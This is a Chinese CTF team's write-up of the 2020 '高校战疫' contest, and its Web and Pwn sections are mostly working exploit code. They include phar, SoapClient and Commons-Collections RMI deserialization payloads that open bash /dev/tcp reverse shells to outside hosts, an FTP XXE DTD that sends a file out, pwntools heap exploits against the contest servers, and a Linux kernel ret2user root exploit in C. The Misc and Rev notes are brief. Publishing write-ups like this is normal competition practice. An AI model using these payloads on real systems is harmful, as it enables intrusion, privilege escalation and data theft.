---
title: 高校战“疫”网络安全分享赛 2020 SU Write Up
tags: ["OtherCTF"]
date: 2020-03-10 12:35:50
slug: "gxzyCTF-2020-su-wu"
---

本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！

以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。

<!--more-->

##	Web
###	PHP UAF
https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php

###	webct
```php
unlink("test.phar");

ini_set('phar.readonly',0);

$phar = new Phar("test.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$a = new Listfile('/ && bash -c "sh >& /dev/tcp/ip/port 0>&1"');
$o = new Fileupload($a);
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); 
    //签名自动计算
$phar->stopBuffering();
```
上 rogue mysql 配合上传的 jpg，用`phar`触发反序列化。

###	sqlcheckin
`username=admini&password='-0-'`

###	webtmp
```
Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg==
```
直接改secret

### hackme
payload.txt
```
>dir
>sl
>g\>
>ht-
*>v
>rev
*v>x
>sh
>ba\
>\%7C\
>51\
>0.\
>13\
>1.\
>6\
>2.\
>18\
>\%20\
>rl\
>cu\
sh%20x
sh%20g
```
poc.py
```
#!/usr/bin/env python

import requests
import time
import os

req = requests.Session()
url = 'http://121.36.222.22:88/core/'
url1 = 'http://121.36.222.22:88/upload_sign.php'
post1={
    "sign":'|O:4:"info":2:{s:5:"admin";i:1;s:4:"sign";s:2:"ls";}'
}
payload = "compress.zlib://data:@127.0.0.1/888?,{}"
req.post(url1,data=post1)
text = req.get(url).content.decode("utf-8")
if len(text)<15:
    print(text)
else:
    print("[+]start attack!!!")
with open("payload.txt","r") as f:
    for i in f:
        i=i.rstrip("\n")
        #print(payload.format(i))
        post_payload={
            "url":payload.format(i)
        }
        print(post_payload)
        text = req.post(url,data=post_payload).content.decode("utf-8")
        time.sleep(1)
        if len(text)>42:
            print(text)
            exit()
        else:
            print("[+]"+payload.format(i)+'\n'+text)

```

### baby_java

有个直接可以反射出来的点, 但是长度有限制, 最多读读 /etc/hostname, 这里采用 ftp xxe 读 /hint.txt  
```xml
<!ENTITY % data SYSTEM "file:///hint.txt">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'ftp://somewhere.someplace:19132/%data;'>">
%all;
```
之后在 payload 里面引用一下这个 dtd 就行了.  
hint.txt 里面写了
```
Method%uFF1A post  
Path %uFF1A /you_never_know_the_path

...pom.xml
```
里面有 fastjson-1.2.48, commons-collections-3.1, commons-configuration-1.6. 可以猜到基本上是 fastjson -> ldap -> 本地 gadget 反序列化.  
直接打会有 waf 拦截, 会拦掉 "type" 和 "prefix", "\u", 这里看 fastjson 源码发现
```java
public final void scanString() {
           np = bp;
           hasSpecial = false;
           char ch;
           for (;;) {
               ch = next();
   
               if (ch == '\"') {
                   break;
               }
   
               if (ch == EOI) {
                   if (!isEOF()) {
                       putChar((char) EOI);
                       continue;
                   }
                   throw new JSONException("unclosed string : " + ch);
               }
   
               if (ch == '\\') {
                   if (!hasSpecial) {
                   // ...
                     case 'x':
                           char x1 = next();
                           char x2 = next();
   
                           boolean hex1 = (x1 >= '0' && x1 <= '9')
                                   || (x1 >= 'a' && x1 <= 'f')
                                   || (x1 >= 'A' && x1 <= 'F');
                           boolean hex2 = (x2 >= '0' && x2 <= '9')
                                   || (x2 >= 'a' && x2 <= 'f')
                                   || (x2 >= 'A' && x2 <= 'F');
                           if (!hex1 || !hex2) {
                               throw new JSONException("invalid escape character \\x" + x1 + x2);
                           }
   
                           char x_char = (char) (digits[x1] * 16 + digits[x2]);
                           putChar(x_char);
                           break;
                    //...
```
可以看到 fastjson 支持标准里面没有的表示方式. Lexer 实际会对 \x12 这种表示方式进行转义. 用着这种方式可以绕掉对 type 的拦截.  
但是 prefix 仍然不行, 多次尝试发现可以利用 fastjson smartMatch 的特性, 在 prefix 前面加个 - 就可以绕过了, _ 却不行..., 这 waf 有点迷惑....  
之后就是常规套路, 不多讲了

### fmkq

```
http://121.37.179.47:1101/?head=\&url=http://127.0.0.1/&begin=%s%
```
就可以 ssrf, fuzz 出来 8080 有个服务. 根据 `/tmp/{file}` 发现是格式化字符串漏洞.  
```
http://121.37.179.47:1101/?head=\&url=http://127.0.0.1:8080/read/file={file.__init__.__globals__[vip].__init__.__globals__}%26vipcode=0&begin=%s%
```
读到 vipcode 之后就可以随便读文件了. 但是把 flag 所在文件夹里面的 fl4g 给 ban 了  
这里审计一下代码, 先访问一次根目录覆盖 current_folder_file
之后
```
http://121.37.179.47:1101/?head=\&begin=%s%&url=http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D{vipfile.__init__.__globals__[current_folder_file][21]}/flag%26vipcode%3DBWUTtnq6d8myKFvJ3wk1VfrecL5ZGQa4Cx9uNpoDHPEiOj7S
```
就可以了

### NothardWeb

生成的时候 & 0x5f5e0ff 了一下, 密钥空间有限, `2**19`, 爆破就行了  
里面是个
```php
<?
if(isset($_GET['cc'])){
    $cc = $_GET['cc'];
    eval(substr($cc, 0, 6));
}
else{
    highlight_file(__FILE__);
}
```
?cc=\`$cc\`;anything you want to execute;
就能绕过, 最里面 tomcat 用 PUT 方法那个 CVE 就能直接写 shell.

最后脚本如下
```python
from Crypto.Cipher import DES
from Crypto.Util.strxor import strxor
import base64
import itertools
import tqdm
import requests
from urllib.parse import quote, unquote
import hashlib

sess = requests.session()
sess.get('http://121.37.161.79:2333/')

enc = unquote(sess.cookies['user'])
print(enc)
enc = base64.b64decode(enc)
enc = base64.b64decode(enc)

sess.cookies.pop('hash')
sess.cookies.pop('user')

part = enc[-16:]
iv = part[:8]
enc = part[8:]

mask = bin(0x5f5e0ff)[2:]
pos = []

for seq, i in enumerate(mask):
    if i == '1':
        pos.append(seq)

global key
key = [0] * 27

def l2i(l):
    r = 0
    for i in l:
        r <<= 1
        r ^= i
    return r


def padz(s):
    return s + b'\x00' * (8 - len(s) % 8)

def pad(s):
    return s + bytearray([(8 - len(s) % 8)]) * (8 - len(s) % 8)


for i in tqdm.tqdm(itertools.product(*[[0, 1] for _ in range(19)])):
    for seq, v in enumerate(i):
        key[pos[seq]] = v
    t = bytearray(str(l2i(key)), 'ascii')
    t += (t + b'\x00' * (8 - len(t) % 8))
    t = t[:8]
    
    des = DES.new(t, DES.MODE_ECB)
    t = des.decrypt(enc)
    t = strxor(iv, t)
    if t == b';}\x06\x06\x06\x06\x06\x06':
        globals()['key'] = padz(str(l2i(key)).encode())[:8]
        break


fake = b'O:4:"User":1:{s:8:"username";s:5:"admin";}'
digest = hashlib.md5(fake).hexdigest()
iv = b'85196940'

des = DES.new(key, DES.MODE_CBC, iv=iv)
fake = des.encrypt(pad(fake))

fake = base64.b64encode(fake)
fake = base64.b64encode(fake)

sess.cookies['hash'] = digest
sess.cookies['user'] = quote(fake.decode())

res = sess.get('http://121.37.161.79:2333/')
print(res.text)

fake = 'O:10:"SoapClient":4:{s:3:"uri";s:5:"rmbbb";s:8:"location";s:124:"http://10.10.1.12/index.php?cc=%60%24cc%60%3Bbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F111.111.111.111%2F19132+0%3E%261%22%3B";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}'

fake = fake.encode()
digest = hashlib.md5(fake).hexdigest()
iv = b'85196940'

des = DES.new(key, DES.MODE_CBC, iv=iv)
fake = des.encrypt(pad(fake))

fake = base64.b64encode(fake)
fake = base64.b64encode(fake)

sess.cookies['hash'] = digest
sess.cookies['user'] = quote(fake.decode())

res = sess.get('http://121.37.161.79:2333/')
print(res.text)
```

### easyweb

```
![](netdoc://xxxx)
```
就能读文件, 但是发现有些不可见字符读出来是问号, 之后查看 lib 文件夹发现 commons-collections-3.1 + rmi 的 hint, 发现有个 MarkDown.class 里面是个 extends Remote 的interface, 函数签名不用反编译就能看出来, 刚好有个参数是 Object 的, 可以利用. 本地造一个
```java
package services;

import java.rmi.Remote;

public interface MarkDown extends Remote {
    String parseDocument(Object input);
}
```
就能调用 rmi 了,   
exp:
```java 
package com.rmb122.test;

import java.io.*;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import services.MarkDown;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public final class Main {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(java.lang.Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash","-c" , "bash -i >& /dev/tcp/111.111.111.111/19132 0>&1"}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap<String, String>();

        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "placeholder");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("placeholder");
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        Registry r = LocateRegistry.getRegistry( "121.36.222.22", 2078);
        MarkDown markDown = (MarkDown) r.lookup("markdown");
        markDown.parseDocument(badAttributeValueExpException);
    }
}
```

##	Pwn

### musl

迷你libc，堆块合并时有类似ptmalloc的unlink
```python
from pwn import *
context.arch = "amd64"
p = remote("119.3.158.103",19008)
se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
libc = ELF("./libc.so")
aBinsh = 0x91345
overflow = "L"*0x50+p64(0x61)+p64(0x20)+p64(0xbadbeef)*2+p64(0x70)+p64(0x81)+"ldddddhm"
prdi = 0x14862
def add(size, YorN, Content):
    sla("> ","1");sla(" >",str(size));sla(" >",YorN);sa(" >",Content)
def delete(Index):
    sla("> ","2");sla(" >",str(Index))
def transform(Index, Content):
    sla("> ","3");sla(" >",str(Index));se(Content)
def examine(Index):
    sla("> ","4");sla(" >",str(Index))
    return ru("e\n")
[add(0x60,"N","LuDuiNiuBi\n") for _ in range(8)]
[delete(i) for i in [3,5,1]]
add(0x38,"Y",overflow)
libc_base = u64(examine(4)[8:14].ljust(8,'\x00'))-0x292e38
transform(1,p64(1)+p64(0x71)+p64(libc_base+0x290000)+p64(libc_base+0x290008)+"\n")
delete(4)
transform(1,p64(libc_base+0x290010)+p64(0x4)+p64(0x602034)+p64(8)+p64(libc_base+0x294fd8)+"\n")
transform(1,p32(0))
retInStack = u64(examine(2)[:6].ljust(8,'\x00'))-0x90
transform(0,p64(0x70)+p64(retInStack)+"\n")
transform(1,p64(libc_base+prdi)+p64(libc_base+aBinsh)+p64(libc_base+libc.symbols["system"])+"\n")
shell()
```

### easyheap

add函数中即使size不对也会先分配一个Item对象再返回进行分配,也就是可以使fastbin的fd指针落到原来的chunk指针的位置前，就可以利用edit任意写.

先劫持free@got为puts@plt泄露libc，然后劫持为system从而getshell。

```python
from pwn import *

def add(len, cont):
	p.sendlineafter("ce:\n", "1")
	p.sendlineafter("e?\n", str(len))
	p.sendafter("e?\n", cont)

def delete(idx):
	p.sendlineafter("ce:\n", "2")
	p.sendlineafter("ed?\n", str(idx))

def edit(idx, cont):
	p.sendlineafter("ce:\n", "3")
	p.sendlineafter("ed?\n", str(idx))
	p.sendafter("ge?\n", cont)

#p = process('./easyheap')
p = remote("121.36.209.145", 9997)

add(0x18, p64(0) + p64(0x100))
delete(0)
p.sendlineafter("ce:\n", "1")
p.sendlineafter("e?\n", str(0x600))
p.sendlineafter("ce:\n", "1")
p.sendlineafter("e?\n", str(0x600))
add(0x18, p64(0) + p64(0x400))
delete(2)
edit(0, p64(0) + p64(0x21) + p64(0x602018))
edit(1, p64(0x400670))
edit(0, p64(0) + p64(0x21) + p64(0x602020))
delete(1)
libc = u64(p.recv(6).ljust(8, "\x00")) - 0x6f690
p.sendlineafter("ce:\n", "1")
p.sendlineafter("e?\n", str(0x600))
p.sendlineafter("ce:\n", "1")
p.sendlineafter("e?\n", str(0x600))
edit(1, p64(0) + p64(0x21) + p64(0x602018))
edit(2, p64(libc + 0x45390))
edit(0, "/bin/sh\0")
delete(0)

p.interactive()
```

### woodenbox2
edit功能存在堆溢出
```c
unsigned __int64 change_item()
{
  int length; // ST08_4
  int idx; // [rsp+4h] [rbp-2Ch]
  int v3; // [rsp+Ch] [rbp-24h]
  char buf; // [rsp+10h] [rbp-20h]
  char nptr; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, &buf, 8uLL);
    idx = atoi(&buf);
    if ( PTR_LIST[2 * idx] )
    {
      printf("Please enter the length of item name:", &buf);
      read(0, &nptr, 8uLL);
      length = atoi(&nptr);
      printf("Please enter the new name of the item:", &nptr);
      v3 = read(0, PTR_LIST[2 * idx], length);  // overflow
      if ( *((_BYTE *)PTR_LIST[2 * idx] + v3 - 1) == 10 )
        *((_BYTE *)PTR_LIST[2 * idx] + v3 - 1) = 0;
      *((_DWORD *)&itemlist + 4 * idx) = strlen((const char *)PTR_LIST[2 * idx]);// 更新长度
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v6;
}
```
先利用堆块合并控制中间的堆块，遗留下main_arena地址，修改低字节指向iofile，修改stdout结构体来泄露libc，接着就劫持malloc_hook
```python
# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './woodenbox2'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = '121.36.215.224'
port = '9998'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))



def add(s, c):
    sla(":", "1")
    sla(":", str(s))
    sea(":", c)

def change(i, s, c):
    sla(":", "2")
    sla(":", str(i))
    sla(":", str(s))
    sea(":", c)

def dele(i):
    sla(":", "3")
    sla(":", str(i))

while True:
    try:
        run(0)
        add(0x10, 'a')
        add(0x10, 'a')
        add(0x10, 'a')
        add(0x10, 'a')
        add(0x10, 'a')
        add(0x98, 'a')
        add(0x68, 'a')
        add(0x98, 'a')
        add(0x10, 'a')
        dele(3+2)
        change(3+2, 0x100, 'a' * 0x60 + p64(0xa0 +0x70) + p64(0xa0))
        dele(4+2)
        add(0x98, 'a')
        add(0x108, 'a')
        change(1+2, 0x200, 'a' * 0x98 + p64(0x71) + 'a' * 0x68 + p64(0x21))
        dele(2+2)
        change(0+2, 0x200, 'a' * 0x98 + p64(0x111))
        dele(2 + 2)
        change(1, 0x200, 'a' * 0x98 + p64(0x71) + '\xdd\x25')
        add(0x68, 'a')
        add(0x68, 'a' * 0x2b + p64(0) + p64(0xfbad3c80) + p64(0) * 3 + p8(0))
        rn(0x40)
        libc.address = un64(rn(6)) -0x3c5600
        print hex(libc.address)
        if libc.address & 0xfff != 0:
            p.close()
            continue
        dele(2)
        change(0, 0x200, 'a' * 0x98 + p64(0x71) + p64(libc.address +0x3c4aed))
        add(0x68, 'a')
        one = libc.address +0x4526a
        add(0x68, 'a' * 0xb + p64(one) + p64(libc.address +0x846CB))
        sla(":", "1")
        dbg("b*" + hex(one))
        sla(":", str(1))
        rc()
        sl("cat flag")
        rc()
        shell()
    except:
        p.close()
```

### babyhacker
flag就在`iniramfs.cpio`中，打开就能看到

### babyhacker2
size比较可以设为负数，buffersize只取两个字节
```c
void __fastcall getsize(unsigned __int64 arg)
{
  _fentry__();
  if ( (signed int)arg >= 11 )
    LOWORD(arg) = 10;
  buffersize = arg;
}
```
```assembly
.text:00000000000000E0 ; void __fastcall getsize(unsigned __int64 arg)
.text:00000000000000E0                 public getsize
.text:00000000000000E0 getsize         proc near               ; DATA XREF: __mcount_loc:0000000000000200↓o
.text:00000000000000E0 arg = rdi                               ; unsigned __int64
.text:00000000000000E0                 call    __fentry__
.text:00000000000000E5                 push    rbp
.text:00000000000000E6                 cmp     edi, 0Bh
.text:00000000000000E9                 mov     eax, 0Ah
.text:00000000000000EE                 cmovge  edi, eax
.text:00000000000000F1                 mov     rbp, rsp
.text:00000000000000F4                 mov     cs:buffersize, di
.text:00000000000000FB                 pop     rbp
.text:00000000000000FC                 retn
.text:00000000000000FC getsize         endp
```
用一个低位为0xFFF的负数即可给予buffersize一个比较大的正数
```c
__int64 __fastcall babyhacker_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  __int64 v3; // rbp
  file *rdx1; // rdx
  signed __int16 v5; // di
  int v4[80]; // [rsp+0h] [rbp-150h]
  unsigned __int64 v8; // [rsp+140h] [rbp-10h]
  __int64 v9; // [rsp+148h] [rbp-8h]

  _fentry__();
  v9 = v3;
  v5 = (signed __int16)rdx1;
  v8 = __readgsqword(0x28u);
  switch ( cmd )
  {
    case 0x30001u:
      babyhacker_ioctl_0(rdx1, 0x30001u, (unsigned __int64)rdx1, (__int64)&v9);
      break;
    case 0x30002u:
      copy_to_user(rdx1, v4, buffersize);
      break;
    case 0x30000u:
      if ( (signed int)rdx1 >= 11 )
        v5 = 10;
      buffersize = v5;
      break;
  }
  return 0LL;
}
```
利用`0x30002`读取栈上数据，得到`canary`与`kernel base`
```c
__int64 __usercall babyhacker_ioctl_0@<rax>(file *file@<rdi>, unsigned int cmd@<esi>, unsigned __int64 arg@<rdx>, __int64 a4@<rbp>)
{
  __int64 result; // rax
  int v4[80]; // [rsp+0h] [rbp-150h]
  unsigned __int64 v6; // [rsp+140h] [rbp-10h]
  __int64 v7; // [rsp+148h] [rbp-8h]

  _fentry__();
  v7 = a4;
  v6 = __readgsqword(0x28u);
  result = copy_from_user(v4, file, buffersize);
  __readgsqword(0x28u);
  return result;
}
```
利用`0x30001`栈溢出，布置ROPCHAIN实现ret2user
exp.c
```c
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int fd;

char payload[0x1000];
char padding[0x144]={0};
int payload_len = 0;
unsigned long long user_cs, user_ss, user_rflags;
long long user_stack = 0;

long long prepare_kernel_cred;
long long commit_creds;
void launch_shell()
{
    execl("/bin/sh", "sh", NULL);
}

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    asm(
        "push %2\n"
        "swapgs\n"
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "iretq\n"
        :
        :  "r" (user_ss), "r" (user_stack), "r" (user_rflags), "r" (user_cs), "r" (&launch_shell)
        : "memory"
    );
}


static void save_state() 
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

void join_data(long long data){
    unsigned char buf[8] = {0};
    memcpy(buf, &data, 8);
    memcpy(payload + payload_len, buf, 8);
    payload_len += 8;
}
void join_str(char *buf)
{
    int len = strlen(buf);
    memcpy(payload + payload_len, buf, len);
    payload_len += len;
}

int main()
{
    signal(SIGSEGV, launch_shell);
    save_state();
    fd = open("/dev/babyhacker", O_RDONLY);
    printf("%d\n",fd);
    ioctl(fd, 0x30000, 0xf0000fff);
    long long *buf=(long long *)malloc(0x1000);
    if(buf==0)
    {
        puts("malloc error");
    }
    ioctl(fd, 0x30002, buf);
    long long ret=buf[0x2a];
    long long base = ret - 0xffffffff81219218;
    long long canary=buf[0x28];
    long long poprdi = base + 0xffffffff8109054d;
    long long rdi2cr4 = base + 0xffffffff81004d70;
    prepare_kernel_cred = base + 0xffffffff810a1820;
    commit_creds = base + 0xffffffff810a1430;
    user_stack=&poprdi;
    printf("%p\n%p\n",canary, ret);
    memset(padding, 'a', 0x140);
    join_str(padding);
    join_data(canary);
    join_data(1); // rbp
    join_data(poprdi);
    join_data(0x6f0);
    join_data(rdi2cr4);
    join_data(user_stack+0x200);
    join_data(&get_root);
    ioctl(fd, 0x30001, payload);

    
    return 0;
}
/*
0xffffffff81219218
0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret
0xffffffff8109054d : pop rdi ; ret
*/
```
利用musl-gcc可以编译出很小的静态链接程序
### bjut
索引可以为负数，通过`Elf64_Rela`结构体的GOT表值来泄漏libc与修改GOT表，改free为system执行submit即可
```python
# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './hw'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = '121.37.167.199'
port = '9997'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)
# -1879


def add():
    sla(">", "1")
    sla(":\n", "20")
    sla(":\n", "/bin/sh")


def modify(s):
    sla(">", "2")
    sla(":\n", "-1879")
    sea(":\n", s)


def dele():
    sla(">", "3")
    sla(":\n", "0")


def show():
    sla(">", "4")
    sla(":\n", "-1879")


add()
dele()
show()
ru("hw:\n")
libc.address = un64(rn(6)) - libc.symbols['free']
print hex(libc.address)
add()
# dbg("b*0x0000000000401487")
modify(p64(libc.symbols['system']))
dbg("b*0x00000000004016DA")
sla(">", "5")
shell()
```

##	Misc

### 2019-nCoV

 ### 简单MISC
解压photo.jpg得到一串摩尔斯码，解码得到flag.zip的解压密码，再解base64
 ### 隐藏的信息
压缩包伪加密，解压发现音频，结尾和开头处有电话按键音，为DTMF信号，分析一下频率就好最后得到号码为187485618521,二维码那个图片结尾16进制说flag用base64提交

##	Rev
### fxck!
题目有两个重要函数一个是400C3A和400A56。

其中400C3A为变字母表的base58,400a56为brainfack，不过400a56的结果已经打印出来，我们调试即可。调试出结果，将其换表后在进行base58解密

```python
base_now="ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz"
base_init="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

clear="4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe"
c=""
for i in range(len(clear)):
    b=base_now.find(clear[i])
    c+=base_init[b]
```

base58不止改了码表开头根据长度生成了8bit放在开头，根据题目提示长度是42，所以生成的8bit是0xe0，然后码表解密后替换
所以你只要长度为42开头都是S
但是题目有毛病后来出题人改了
第二个函数就是单纯生成正确密文
4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe
然后直接比较
但有趣的是，正确密文没有放对应0xe0，可能是出题人改题目时间比较紧就放低难度了把
总之很无语
瞬间变成签到题
flag{63510cf7-2b80-45e1-a186-21234897e5cd}
然后你会发现运行程序输入这个flag还是过不了check
但是问题不大，比起“密文破译”里的迷惑行为这个还能写写

### cycle graph
调试即可出，类似明文比较只不过要过最后一个check只有一个答案

### 天津垓
反调试俩个
smc
elgamal算法求逆元即可

### easyparser
bss段存放输入，因为会录入回车要进去修改一下
判断格式后进行简单操作验证（(input^0x63) << (v112 & 0x3F)）
每次都有个check_sign来判断是否不相等
爆破即可
























##	Crypto